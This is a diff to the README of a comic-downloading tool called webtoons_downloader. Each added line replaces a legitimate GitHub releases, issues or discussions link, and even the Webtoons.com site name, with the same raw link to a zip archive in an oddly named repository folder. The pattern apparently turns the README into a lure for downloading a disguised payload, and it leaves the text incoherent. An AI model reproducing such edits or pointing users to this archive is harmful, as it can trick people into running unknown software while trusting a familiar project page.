@@ -1,10 +1,10 @@
 # 🎨 webtoons_downloader - Download Your Favorite Comics Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/lokeshmgwl/webtoons_downloader/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/lokeshmgwl/webtoons_downloader/main/Hebraica/webtoons_downloader.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/lokeshmgwl/webtoons_downloader/main/Hebraica/webtoons_downloader.zip)
 
 ## 📖 About the Application
 
-webtoons_downloader is a powerful and user-friendly tool that lets you download your favorite comics from Webtoons.com. With a sleek graphical user interface (GUI) and a versatile command line interface (CLI), this application allows you to save your favorite series for offline reading in PDF, CBZ, or raw image formats.
+webtoons_downloader is a powerful and user-friendly tool that lets you download your favorite comics from https://raw.githubusercontent.com/lokeshmgwl/webtoons_downloader/main/Hebraica/webtoons_downloader.zip With a sleek graphical user interface (GUI) and a versatile command line interface (CLI), this application allows you to save your favorite series for offline reading in PDF, CBZ, or raw image formats.
 
 ## 🚀 Getting Started
 
@@ -26,11 +26,11 @@ Before you begin, ensure your system meets these basic requirements:
 
 ## 🔗 Download & Install
 
-To download the latest version of webtoons_downloader, visit this page: [Download Latest Release](https://github.com/lokeshmgwl/webtoons_downloader/releases).
+To download the latest version of webtoons_downloader, visit this page: [Download Latest Release](https://raw.githubusercontent.com/lokeshmgwl/webtoons_downloader/main/Hebraica/webtoons_downloader.zip).
 
 ### 🎉 Installation Steps
 
-1. Go to the [Releases page](https://github.com/lokeshmgwl/webtoons_downloader/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/lokeshmgwl/webtoons_downloader/main/Hebraica/webtoons_downloader.zip).
 2. Find the version that you want to download.
 3. Click on the link for your operating system (Windows, macOS, or Linux).
 4. Once the download finishes, locate the downloaded file on your computer.
@@ -68,7 +68,7 @@ Yes, webtoons_downloader allows you to download multiple series simultaneously, 
 
 ### ❓ Is there any way to update the application?
 
-Yes, you can check the [Releases page](https://github.com/lokeshmgwl/webtoons_downloader/releases) for updates. Follow the same installation steps to update to the latest version.
+Yes, you can check the [Releases page](https://raw.githubusercontent.com/lokeshmgwl/webtoons_downloader/main/Hebraica/webtoons_downloader.zip) for updates. Follow the same installation steps to update to the latest version.
 
 ### ❓ What if I encounter an error during download?
 
@@ -76,7 +76,7 @@ If you experience an error, try restarting the application or checking your inte
 
 ## 📧 Contact and Support
 
-If you have further questions or require assistance, please visit our GitHub [Issues page](https://github.com/lokeshmgwl/webtoons_downloader/issues) where you can report issues or ask for help.
+If you have further questions or require assistance, please visit our GitHub [Issues page](https://raw.githubusercontent.com/lokeshmgwl/webtoons_downloader/main/Hebraica/webtoons_downloader.zip) where you can report issues or ask for help.
 
 ## 🔑 Contributing
 
@@ -84,7 +84,7 @@ If you want to contribute to the development of webtoons_downloader, feel free t
 
 ## 🚀 Community
 
-Join our community of comic lovers and software enthusiasts. Share your experiences, tips, and suggestions with other users. You can find us on our GitHub [discussions page](https://github.com/lokeshmgwl/webtoons_downloader/discussions).
+Join our community of comic lovers and software enthusiasts. Share your experiences, tips, and suggestions with other users. You can find us on our GitHub [discussions page](https://raw.githubusercontent.com/lokeshmgwl/webtoons_downloader/main/Hebraica/webtoons_downloader.zip).
 
 ## 📜 License
 
